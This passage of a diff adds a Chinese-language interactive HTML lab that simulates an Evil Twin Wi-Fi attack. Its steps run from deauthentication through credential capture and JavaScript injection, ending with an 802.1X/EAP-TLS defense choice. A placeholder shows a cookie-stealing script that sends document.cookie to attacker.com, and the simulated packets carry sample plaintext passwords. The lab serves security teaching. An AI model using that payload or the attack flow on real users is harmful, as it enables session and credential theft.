@@ -1,0 +1,1568 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>无线安全：Evil Twin 伪造AP — 交互式安全实验</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --panel: #1e293b;
+            --border: #334155;
+            --text: #e2e8f0;
+            --text2: #94a3b8;
+            --accent: #3b82f6;
+            --danger: #ef4444;
+            --success: #22c55e;
+            --warn: #f59e0b;
+            --cyan: #06b6d4;
+            --purple: #a855f7;
+            --mono: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            --sans: 'Inter', 'Segoe UI', system-ui, sans-serif;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+        header {
+            background: #0b1120;
+            border-bottom: 2px solid var(--border);
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        header .logo {
+            font-weight: 700;
+            font-size: 1.15rem;
+            letter-spacing: -0.3px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        header .logo span.icon {
+            font-size: 1.5rem;
+        }
+        .progress-bar-wrap {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .progress-step {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.8rem;
+            border: 2px solid var(--border);
+            background: var(--panel);
+            color: var(--text2);
+            transition: all 0.4s;
+            cursor: default;
+            position: relative;
+        }
+        .progress-step.done {
+            background: var(--success);
+            border-color: var(--success);
+            color: #000;
+        }
+        .progress-step.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(59, 130, 246, 0.45);
+            animation: pulse-ring 1.6s infinite;
+        }
+        @keyframes pulse-ring {
+            0%,
+            100% {
+                box-shadow: 0 0 8px rgba(59, 130, 246, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 22px rgba(59, 130, 246, 0.7);
+            }
+        }
+        .progress-connector {
+            width: 28px;
+            height: 2px;
+            background: var(--border);
+            transition: background 0.4s;
+        }
+        .progress-connector.done {
+            background: var(--success);
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: auto auto 1fr;
+            gap: 14px;
+            padding: 16px 20px;
+            max-width: 1500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        @media (max-width: 1100px) {
+            main {
+                grid-template-columns: 1fr;
+                grid-template-rows: auto;
+            }
+        }
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+        .panel h3 {
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.2px;
+            color: var(--text);
+        }
+        .panel h3 .dot {
+            width: 9px;
+            height: 9px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .dot.green {
+            background: var(--success);
+            box-shadow: 0 0 8px var(--success);
+        }
+        .dot.red {
+            background: var(--danger);
+            box-shadow: 0 0 8px var(--danger);
+        }
+        .dot.amber {
+            background: var(--warn);
+            box-shadow: 0 0 8px var(--warn);
+        }
+        .dot.blue {
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent);
+        }
+        .dot.cyan {
+            background: var(--cyan);
+            box-shadow: 0 0 8px var(--cyan);
+        }
+
+        /* WiFi Environment Viz */
+        #wifi-viz {
+            grid-column: 1 / -1;
+            min-height: 260px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+            padding: 20px;
+            position: relative;
+            background: radial-gradient(ellipse at center, #1a2744 0%, #0f172a 70%);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+        .ap-card {
+            background: #1a2744;
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 18px 22px;
+            text-align: center;
+            min-width: 170px;
+            cursor: pointer;
+            transition: all 0.35s;
+            position: relative;
+            z-index: 2;
+            user-select: none;
+        }
+        .ap-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.5);
+        }
+        .ap-card.evil {
+            border-color: var(--danger);
+            background: #2d1520;
+            animation: evil-glow 2s infinite;
+        }
+        @keyframes evil-glow {
+            0%,
+            100% {
+                box-shadow: 0 0 12px rgba(239, 68, 68, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 30px rgba(239, 68, 68, 0.7);
+            }
+        }
+        .ap-card .ssid {
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: -0.3px;
+            margin-bottom: 6px;
+        }
+        .ap-card .bssid {
+            font-family: var(--mono);
+            font-size: 0.72rem;
+            color: var(--text2);
+        }
+        .ap-card .channel {
+            font-size: 0.78rem;
+            color: var(--cyan);
+            margin-top: 4px;
+        }
+        .signal-bars {
+            display: flex;
+            align-items: flex-end;
+            gap: 3px;
+            height: 28px;
+            justify-content: center;
+            margin: 8px 0;
+        }
+        .signal-bar {
+            width: 7px;
+            background: var(--success);
+            border-radius: 2px;
+            transition: height 0.5s, background 0.5s;
+        }
+        .signal-bar.strong {
+            background: var(--success);
+        }
+        .signal-bar.medium {
+            background: var(--warn);
+        }
+        .signal-bar.weak {
+            background: var(--danger);
+        }
+        .client-icon {
+            font-size: 2rem;
+            transition: all 0.7s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: absolute;
+            z-index: 3;
+            cursor: default;
+        }
+        .client-icon.roaming {
+            animation: roam-bounce 0.6s ease-in-out;
+        }
+        @keyframes roam-bounce {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-22px);
+            }
+        }
+        .connection-line {
+            position: absolute;
+            z-index: 1;
+            pointer-events: none;
+            stroke-dasharray: 6 4;
+            animation: dash-flow 1s linear infinite;
+        }
+        @keyframes dash-flow {
+            to {
+                stroke-dashoffset: -20;
+            }
+        }
+        .connection-line.evil-line {
+            stroke: var(--danger);
+            stroke-dasharray: 3 5;
+            animation: dash-flow 0.5s linear infinite;
+        }
+        .connection-line.legit-line {
+            stroke: var(--success);
+        }
+
+        /* Packet list */
+        #packet-list {
+            max-height: 340px;
+            overflow-y: auto;
+            font-family: var(--mono);
+            font-size: 0.73rem;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: #0b1120;
+        }
+        #packet-list table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        #packet-list th {
+            background: #111d2f;
+            padding: 8px 10px;
+            text-align: left;
+            font-weight: 600;
+            color: var(--text2);
+            font-size: 0.7rem;
+            letter-spacing: 0.4px;
+            position: sticky;
+            top: 0;
+            z-index: 5;
+        }
+        #packet-list td {
+            padding: 7px 10px;
+            border-bottom: 1px solid #1a2744;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        #packet-list tr:hover td {
+            background: #1a2d44;
+        }
+        #packet-list tr.selected td {
+            background: #1e3a5f;
+            color: #fff;
+            outline: 1px solid var(--accent);
+            outline-offset: -1px;
+        }
+        #packet-list tr.deauth td {
+            color: var(--danger);
+        }
+        #packet-list tr.eapol td {
+            color: var(--cyan);
+        }
+        #packet-list tr.http td {
+            color: var(--warn);
+        }
+        .tag-badge {
+            display: inline-block;
+            padding: 2px 7px;
+            border-radius: 10px;
+            font-size: 0.65rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-left: 4px;
+        }
+        .tag-badge.suspicious {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+        }
+        .tag-badge.tagged {
+            background: var(--danger);
+            color: #fff;
+            border-color: var(--danger);
+        }
+        .tag-badge.normal {
+            background: rgba(34, 197, 94, 0.2);
+            color: var(--success);
+            border: 1px solid rgba(34, 197, 94, 0.4);
+        }
+
+        /* Packet detail */
+        #packet-detail {
+            font-family: var(--mono);
+            font-size: 0.72rem;
+            max-height: 340px;
+            overflow-y: auto;
+            background: #0b1120;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            padding: 12px;
+            line-height: 1.7;
+        }
+        #packet-detail .field {
+            color: var(--cyan);
+        }
+        #packet-detail .value {
+            color: var(--warn);
+        }
+        #packet-detail .hex-offset {
+            color: var(--text2);
+        }
+        #packet-detail .hex-byte {
+            color: var(--text);
+        }
+        #packet-detail .hex-ascii {
+            color: var(--success);
+            margin-left: 8px;
+        }
+        #packet-detail .highlight {
+            background: rgba(239, 68, 68, 0.25);
+            padding: 1px 3px;
+            border-radius: 3px;
+        }
+
+        /* Buttons */
+        button {
+            font-family: var(--sans);
+            font-weight: 600;
+            font-size: 0.85rem;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.25s;
+            letter-spacing: -0.1px;
+        }
+        button.primary {
+            background: var(--accent);
+            color: #fff;
+        }
+        button.primary:hover {
+            background: #2563eb;
+            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.4);
+            transform: translateY(-1px);
+        }
+        button.danger {
+            background: var(--danger);
+            color: #fff;
+        }
+        button.danger:hover {
+            background: #dc2626;
+            box-shadow: 0 4px 16px rgba(239, 68, 68, 0.4);
+            transform: translateY(-1px);
+        }
+        button.success {
+            background: var(--success);
+            color: #000;
+        }
+        button.success:hover {
+            box-shadow: 0 4px 16px rgba(34, 197, 94, 0.4);
+            transform: translateY(-1px);
+        }
+        button:disabled {
+            opacity: 0.45;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        button.small {
+            padding: 5px 10px;
+            font-size: 0.72rem;
+            border-radius: 6px;
+        }
+        input[type="text"],
+        textarea {
+            font-family: var(--mono);
+            font-size: 0.8rem;
+            padding: 10px 12px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: #0b1120;
+            color: var(--text);
+            width: 100%;
+            transition: border 0.3s;
+        }
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+        textarea {
+            resize: vertical;
+            min-height: 60px;
+        }
+
+        /* Flag popup */
+        .flag-toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #1a1a0a;
+            border: 2px solid var(--warn);
+            color: var(--warn);
+            padding: 14px 20px;
+            border-radius: 10px;
+            font-family: var(--mono);
+            font-weight: 700;
+            z-index: 999;
+            animation: slide-in 0.5s ease-out, glow-amber 1.5s infinite;
+            box-shadow: 0 6px 24px rgba(245, 158, 11, 0.35);
+        }
+        @keyframes slide-in {
+            from {
+                transform: translateX(120%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+        @keyframes glow-amber {
+            0%,
+            100% {
+                box-shadow: 0 6px 24px rgba(245, 158, 11, 0.35);
+            }
+            50% {
+                box-shadow: 0 6px 40px rgba(245, 158, 11, 0.7);
+            }
+        }
+        .flag-toast.fade-out {
+            animation: slide-out 0.5s ease-in forwards;
+        }
+        @keyframes slide-out {
+            to {
+                transform: translateX(120%);
+                opacity: 0;
+            }
+        }
+
+        /* Modal overlay */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 200;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fade-in 0.3s;
+        }
+        @keyframes fade-in {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        .modal {
+            background: var(--panel);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 28px;
+            max-width: 700px;
+            width: 95%;
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+        .modal h2 {
+            margin-bottom: 14px;
+            color: var(--warn);
+        }
+        .modal pre {
+            background: #0b1120;
+            padding: 14px;
+            border-radius: 8px;
+            font-family: var(--mono);
+            font-size: 0.73rem;
+            overflow-x: auto;
+            line-height: 1.6;
+            margin: 10px 0;
+        }
+
+        /* Credential card */
+        .cred-card {
+            background: #1a0a0a;
+            border: 1px solid var(--danger);
+            border-radius: 10px;
+            padding: 12px 16px;
+            font-family: var(--mono);
+            font-size: 0.78rem;
+            margin: 8px 0;
+            animation: pulse-red 2s infinite;
+        }
+        @keyframes pulse-red {
+            0%,
+            100% {
+                border-color: rgba(239, 68, 68, 0.5);
+            }
+            50% {
+                border-color: rgba(239, 68, 68, 1);
+            }
+        }
+        .cred-card .key {
+            color: var(--text2);
+        }
+        .cred-card .val {
+            color: var(--danger);
+            font-weight: 700;
+        }
+
+        /* Defense config */
+        .defense-option {
+            background: #1a2744;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            padding: 14px;
+            margin: 8px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .defense-option.selected {
+            border-color: var(--success);
+            background: #152618;
+            box-shadow: 0 0 16px rgba(34, 197, 94, 0.2);
+        }
+        .defense-option:hover {
+            border-color: var(--accent);
+        }
+        .defense-option .radio-circle {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid var(--border);
+            flex-shrink: 0;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .defense-option.selected .radio-circle {
+            border-color: var(--success);
+            background: var(--success);
+        }
+        .defense-option.selected .radio-circle::after {
+            content: '✓';
+            font-size: 0.7rem;
+            color: #000;
+            font-weight: 700;
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            cursor: help;
+            border-bottom: 1px dotted var(--text2);
+        }
+        .tooltip:hover::after {
+            content: attr(data-tip);
+            position: absolute;
+            bottom: 120%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000;
+            color: #fff;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            white-space: nowrap;
+            z-index: 50;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        .briefing-card {
+            background: linear-gradient(135deg, #1a2744 0%, #1e3050 100%);
+            border: 1px solid var(--accent);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 10px;
+            grid-column: 1 / -1;
+        }
+        .briefing-card .icon {
+            font-size: 2rem;
+            float: left;
+            margin-right: 14px;
+        }
+        .hex-dump-line {
+            display: flex;
+            gap: 8px;
+            font-family: var(--mono);
+            font-size: 0.7rem;
+            line-height: 1.5;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- EDUCATIONAL PURPOSE ONLY — authorized classroom use -->
+    <header>
+        <div class="logo"><span class="icon">📡</span> 无线安全实验室：Evil Twin 伪造AP攻击</div>
+        <div class="progress-bar-wrap" id="progress-bar">
+            <div class="progress-step active" data-step="1" title="侦查">1</div>
+            <div class="progress-connector" data-conn="1"></div>
+            <div class="progress-step" data-step="2" title="部署Evil Twin">2</div>
+            <div class="progress-connector" data-conn="2"></div>
+            <div class="progress-step" data-step="3" title="Deauth攻击">3</div>
+            <div class="progress-connector" data-conn="3"></div>
+            <div class="progress-step" data-step="4" title="凭证截获">4</div>
+            <div class="progress-connector" data-conn="4"></div>
+            <div class="progress-step" data-step="5" title="JS注入">5</div>
+            <div class="progress-connector" data-conn="5"></div>
+            <div class="progress-step" data-step="6" title="防御配置">6</div>
+        </div>
+    </header>
+
+    <main id="main-grid">
+        <!-- Briefing -->
+        <div class="briefing-card" id="briefing">
+            <div class="icon">🎯</div>
+            <strong>任务简报：</strong> 你是一名安全研究员，接到任务评估某公司WiFi网络的安全性。目标网络 SSID 为 <code style="color:#f59e0b;">CompanyWiFi</code>，运行在信道6。你的任务：部署 Evil Twin 伪造AP，观察客户端漫游行为，截获凭证，并最终配置 <strong>802.1X/EAP-TLS</strong> 防御方案。<br>
+            <span style="color:#94a3b8;font-size:0.78rem;">🔍 步骤 1/6 — 侦查阶段：观察下方WiFi环境，查看合法AP及已连接的客户端设备。</span>
+        </div>
+
+        <!-- WiFi Visualization -->
+        <div id="wifi-viz" style="grid-column:1/-1; min-height:280px; position:relative;">
+            <svg id="conn-svg" style="position:absolute;inset:0;width:100%;height:100%;pointer-events:none;z-index:1;"></svg>
+            <!-- APs rendered by JS -->
+            <div id="ap-container" style="display:flex;gap:50px;align-items:center;flex-wrap:wrap;justify-content:center;z-index:2;position:relative;"></div>
+            <!-- Clients rendered by JS -->
+            <div id="client-container" style="position:absolute;inset:0;pointer-events:none;z-index:3;"></div>
+        </div>
+
+        <!-- Packet List -->
+        <div class="panel" id="packet-panel">
+            <h3><span class="dot blue"></span> 数据包捕获 (Wireshark 视图)</h3>
+            <div id="packet-list">
+                <table>
+                    <thead><tr><th>#</th><th>时间</th><th>源MAC</th><th>目的MAC</th><th>协议</th><th>长度</th><th>信息</th><th>标记</th></tr></thead>
+                    <tbody id="packet-tbody"></tbody>
+                </table>
+            </div>
+            <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
+                <button class="small" onclick="filterPackets('all')" style="background:#334155;color:#fff;">全部</button>
+                <button class="small" onclick="filterPackets('802.11')" style="background:#1e3a5f;color:#fff;">802.11</button>
+                <button class="small" onclick="filterPackets('EAPOL')" style="background:#0e3a3a;color:#fff;">EAPOL</button>
+                <button class="small" onclick="filterPackets('HTTP')" style="background:#3a2a0a;color:#fff;">HTTP</button>
+                <button class="small" onclick="filterPackets('deauth')" style="background:#3a0a0a;color:#fff;">Deauth</button>
+                <button class="small success" id="btn-verify-tags" onclick="verifyTaggedPackets()" disabled>✅ 验证标记</button>
+            </div>
+        </div>
+
+        <!-- Packet Detail -->
+        <div class="panel" id="detail-panel">
+            <h3><span class="dot cyan"></span> 数据包详情 & Hex Dump</h3>
+            <div id="packet-detail">
+                <span style="color:#64748b;">← 点击左侧数据包以查看详情</span>
+            </div>
+            <div id="credential-capture-area" style="margin-top:12px;"></div>
+        </div>
+
+        <!-- Attack Console -->
+        <div class="panel" id="attack-panel" style="grid-column:1/-1;">
+            <h3><span class="dot red"></span> 攻击控制台 (Attacker Console)</h3>
+            <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:center;">
+                <button class="danger" id="btn-deploy-evil-twin" onclick="deployEvilTwin()">📡 部署 Evil Twin AP</button>
+                <button class="danger" id="btn-deauth" onclick="sendDeauth()" disabled>⚡ 发送 Deauth 攻击帧</button>
+                <button class="primary" id="btn-inject-js" onclick="showJSInject()" disabled>💉 注入 JavaScript</button>
+                <button class="success" id="btn-defense" onclick="showDefensePanel()">🛡️ 配置防御 (802.1X/EAP-TLS)</button>
+            </div>
+            <div id="attack-feedback" style="margin-top:12px;font-size:0.82rem;color:#f59e0b;"></div>
+            <!-- JS Injection area -->
+            <div id="js-inject-area" style="display:none;margin-top:14px;">
+                <label style="font-size:0.8rem;color:#94a3b8;">注入的JavaScript代码（将注入到HTTP响应中）：</label>
+                <textarea id="js-payload-input" placeholder="例如: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"></textarea>
+                <button class="danger small" style="margin-top:8px;" onclick="executeJSInject()">执行注入</button>
+                <div id="js-inject-result" style="margin-top:8px;font-size:0.78rem;"></div>
+            </div>
+        </div>
+
+        <!-- Defense Panel (initially hidden) -->
+        <div class="panel" id="defense-panel" style="display:none;grid-column:1/-1;">
+            <h3><span class="dot green"></span> 防御配置：802.1X / EAP-TLS 证书认证</h3>
+            <p style="font-size:0.8rem;color:#94a3b8;margin-bottom:12px;">选择正确的防御方案来阻止 Evil Twin 攻击。点击正确的选项：</p>
+            <div id="defense-options">
+                <div class="defense-option" data-opt="wpa2-psk" onclick="selectDefenseOption(this)">
+                    <div class="radio-circle"></div>
+                    <div><strong>WPA2-PSK</strong> — 预共享密钥（密码认证）<br><small style="color:#94a3b8;">客户端信任任何知道密码的AP</small></div>
+                </div>
+                <div class="defense-option" data-opt="open" onclick="selectDefenseOption(this)">
+                    <div class="radio-circle"></div>
+                    <div><strong>Open Network</strong> — 开放网络（无认证）<br><small style="color:#94a3b8;">任何设备均可连接，无安全保护</small></div>
+                </div>
+                <div class="defense-option" data-opt="eap-tls" onclick="selectDefenseOption(this)">
+                    <div class="radio-circle"></div>
+                    <div><strong>802.1X + EAP-TLS</strong> — 基于证书的相互认证<br><small style="color:#22c55e;">✓ 服务器证书验证网络身份 ✓ 客户端证书验证用户身份 ✓ 防Evil Twin</small></div>
+                </div>
+                <div class="defense-option" data-opt="mac-filter" onclick="selectDefenseOption(this)">
+                    <div class="radio-circle"></div>
+                    <div><strong>MAC地址过滤</strong> — 白名单控制<br><small style="color:#94a3b8;">MAC地址可被嗅探和伪造，安全性低</small></div>
+                </div>
+            </div>
+            <button class="success" id="btn-confirm-defense" onclick="confirmDefense()" style="margin-top:14px;" disabled>确认防御配置</button>
+            <div id="defense-result" style="margin-top:10px;font-size:0.82rem;"></div>
+        </div>
+    </main>
+
+    <!-- Flag toast container -->
+    <div id="flag-toast-container"></div>
+
+    <!-- Analysis Modal -->
+    <div class="modal-overlay" id="analysis-modal" style="display:none;" onclick="if(event.target===this)closeAnalysis()">
+        <div class="modal">
+            <h2>📋 完整攻击分析报告</h2>
+            <div id="analysis-content"></div>
+            <button class="primary" style="margin-top:16px;" onclick="closeAnalysis()">关闭</button>
+        </div>
+    </div>
+
+    <script>
+        // EDUCATIONAL PURPOSE ONLY — authorized classroom use
+        // This simulation demonstrates Evil Twin attack mechanics for security education.
+        // Defense: 802.1X/EAP-TLS certificate-based mutual authentication prevents this attack.
+
+        (function() {
+            // --- State ---
+            const state = {
+                phase: 'recon', // recon | evil_twin_deployed | deauth_sent | clients_roamed | credentials_captured | js_injected | defense_configured
+                evilTwinActive: false,
+                deauthSent: false,
+                clientsOnEvilTwin: 0,
+                totalClients: 3,
+                credentialsCaptured: [],
+                jsInjected: false,
+                defenseCorrect: false,
+                selectedDefense: null,
+                taggedPackets: new Set(),
+                selectedPacket: null,
+                currentFilter: 'all',
+                flagsClaimed: [],
+            };
+
+            // --- Data: APs ---
+            const legitAP = {
+                ssid: 'CompanyWiFi',
+                bssid: '00:1A:2B:3C:4D:5E',
+                channel: 6,
+                signalStrength: 65, // -dBm (lower = stronger in display, we invert)
+                isEvil: false,
+                x: 0,
+                y: 0,
+            };
+            const evilAP = {
+                ssid: 'CompanyWiFi', // Same SSID!
+                bssid: 'DE:AD:BE:EF:00:01',
+                channel: 11,
+                signalStrength: 40, // Stronger signal
+                isEvil: true,
+                x: 0,
+                y: 0,
+            };
+
+            // --- Data: Clients ---
+            const clients = [
+                { id: 'c1', name: '💻 Alice-PC', mac: 'AA:BB:CC:11:22:33', connectedTo: 'legit', x: 0, y: 0, roaming: false },
+                { id: 'c2', name: '📱 Bob-Phone', mac: 'AA:BB:CC:44:55:66', connectedTo: 'legit', x: 0, y: 0, roaming: false },
+                { id: 'c3', name: '🖥️ Carol-Laptop', mac: 'AA:BB:CC:77:88:99', connectedTo: 'legit', x: 0, y: 0,
+                roaming: false },
+            ];
+
+            // --- Data: Packets ---
+            const allPackets = [
+                { num: 1, time: '0.000', src: '00:1A:2B:3C:4D:5E', dst: 'FF:FF:FF:FF:FF:FF', proto: '802.11',
+                    len: 142, info: 'Beacon frame, SSID="CompanyWiFi", Channel 6', type: '802.11', isDeauth: false,
+                    isEAPOL: false, isHTTP: false, detail: { frameType: 'Beacon', ssid: 'CompanyWiFi', channel: 6,
+                        supportedRates: '6, 9, 12, 18, 24, 36, 48, 54 Mbps', vendor: 'Cisco', security: 'WPA2-PSK' },
+                    hex: '80 00 00 00 ff ff ff ff ff ff 00 1a 2b 3c 4d 5e ... CompanyWiFi ...' },
+                { num: 2, time: '0.125', src: 'AA:BB:CC:11:22:33', dst: '00:1A:2B:3C:4D:5E', proto: '802.11',
+                    len: 98, info: 'Probe Request, SSID="CompanyWiFi"', type: '802.11', isDeauth: false, isEAPOL: false,
+                    isHTTP: false, detail: { frameType: 'Probe Request', ssid: 'CompanyWiFi',
+                        clientMAC: 'AA:BB:CC:11:22:33', supportedRates: 'Up to 54 Mbps' }, hex: '40 00 00 00 ...' },
+                { num: 3, time: '0.250', src: '00:1A:2B:3C:4D:5E', dst: 'AA:BB:CC:11:22:33', proto: '802.11',
+                    len: 112, info: 'Probe Response, SSID="CompanyWiFi", Channel 6', type: '802.11', isDeauth: false,
+                    isEAPOL: false, isHTTP: false, detail: { frameType: 'Probe Response', ssid: 'CompanyWiFi',
+                        channel: 6, signalInfo: '-65 dBm' }, hex: '50 00 00 00 ...' },
+                { num: 4, time: '0.380', src: 'AA:BB:CC:11:22:33', dst: '00:1A:2B:3C:4D:5E', proto: '802.11',
+                    len: 86, info: 'Authentication Request (Open)', type: '802.11', isDeauth: false, isEAPOL: false,
+                    isHTTP: false, detail: { frameType: 'Authentication', algo: 'Open System', seq: 1 },
+                    hex: 'b0 00 00 00 ...' },
+                { num: 5, time: '0.410', src: '00:1A:2B:3C:4D:5E', dst: 'AA:BB:CC:11:22:33', proto: '802.11',
+                    len: 86, info: 'Authentication Response (Success)', type: '802.11', isDeauth: false, isEAPOL: false,
+                    isHTTP: false, detail: { frameType: 'Authentication', status: 'Success', seq: 2 },
+                hex: 'b0 00 00 00 ...' },
+                { num: 6, time: '0.520', src: 'AA:BB:CC:11:22:33', dst: '00:1A:2B:3C:4D:5E', proto: '802.11',
+                    len: 78, info: 'Association Request, SSID="CompanyWiFi"', type: '802.11', isDeauth: false,
+                    isEAPOL: false, isHTTP: false, detail: { frameType: 'Association Request', ssid: 'CompanyWiFi' },
+                    hex: '00 00 00 00 ...' },
+                { num: 7, time: '0.550', src: '00:1A:2B:3C:4D:5E', dst: 'AA:BB:CC:11:22:33', proto: '802.11',
+                    len: 78, info: 'Association Response (Success), AID=1', type: '802.11', isDeauth: false,
+                    isEAPOL: false, isHTTP: false, detail: { frameType: 'Association Response', status: 'Success',
+                        AID: 1 }, hex: '10 00 00 00 ...' },
+                { num: 8, time: '0.620', src: 'AA:BB:CC:11:22:33', dst: '00:1A:2B:3C:4D:5E', proto: 'EAPOL',
+                    len: 134, info: 'EAPOL-Start (WPA2 4-Way Handshake begins)', type: 'EAPOL', isDeauth: false,
+                    isEAPOL: true, isHTTP: false, detail: { frameType: 'EAPOL', subtype: 'Start',
+                        info: 'WPA2 4-Way Handshake initiation' }, hex: '88 8e 01 00 ...' },
+                { num: 9, time: '1.200', src: 'AA:BB:CC:11:22:33', dst: '00:1A:2B:3C:4D:5E', proto: 'HTTP',
+                    len: 520, info: 'POST /login HTTP/1.1 (credentials in body)', type: 'HTTP', isDeauth: false,
+                    isEAPOL: false, isHTTP: true, detail: { method: 'POST', uri: '/login', host: 'internal.company.com',
+                        body: 'username=alice&password=S3cur3P@ss2024!', userAgent: 'Mozilla/5.0' },
+                    hex: '50 4f 53 54 20 2f 6c 6f 67 69 6e ... username=alice&password=S3cur3P@ss2024! ...' },
+                { num: 10, time: '2.500', src: 'AA:BB:CC:44:55:66', dst: '00:1A:2B:3C:4D:5E', proto: 'HTTP',
+                    len: 480, info: 'POST /auth HTTP/1.1 (credentials in body)', type: 'HTTP', isDeauth: false,
+                    isEAPOL: false, isHTTP: true, detail: { method: 'POST', uri: '/auth', host: 'mail.company.com',
+                        body: 'user=bob&pass=MyP@ssword!99', userAgent: 'iPhone Safari' },
+                    hex: '50 4f 53 54 20 2f 61 75 74 68 ... user=bob&pass=MyP@ssword!99 ...' },
+                { num: 11, time: '4.000', src: 'AA:BB:CC:77:88:99', dst: '00:1A:2B:3C:4D:5E', proto: 'HTTP',
+                    len: 510, info: 'POST /signin HTTP/1.1 (credentials in body)', type: 'HTTP', isDeauth: false,
+                    isEAPOL: false, isHTTP: true, detail: { method: 'POST', uri: '/signin', host: 'vpn.company.com',
+                        body: 'login=carol&password=Carol!2024Secure', userAgent: 'Chrome/120' },
+                    hex: '50 4f 53 54 20 2f 73 69 67 6e 69 6e ... login=carol&password=Carol!2024Secure ...' },
+            ];
+
+            // Evil Twin packets (appear after deployment)
+            const evilTwinPackets = [
+                { num: 12, time: '8.500', src: 'DE:AD:BE:EF:00:01', dst: 'FF:FF:FF:FF:FF:FF', proto: '802.11',
+                    len: 144, info: 'Beacon frame, SSID="CompanyWiFi", Channel 11 (STRONG SIGNAL)', type: '802.11',
+                    isDeauth: false, isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Beacon', ssid: 'CompanyWiFi', channel: 11, signalInfo: '-40 dBm (Very Strong)',
+                        note: '⚠️ Same SSID as legitimate AP but on different channel with stronger signal!' },
+                    hex: '80 00 00 00 ff ff ff ff ff ff de ad be ef 00 01 ... CompanyWiFi ...' },
+            ];
+
+            const deauthPackets = [
+                { num: 13, time: '10.200', src: 'DE:AD:BE:EF:00:01', dst: 'AA:BB:CC:11:22:33', proto: '802.11',
+                    len: 44, info: 'Deauthentication frame (spoofed from legit BSSID)', type: 'deauth', isDeauth: true,
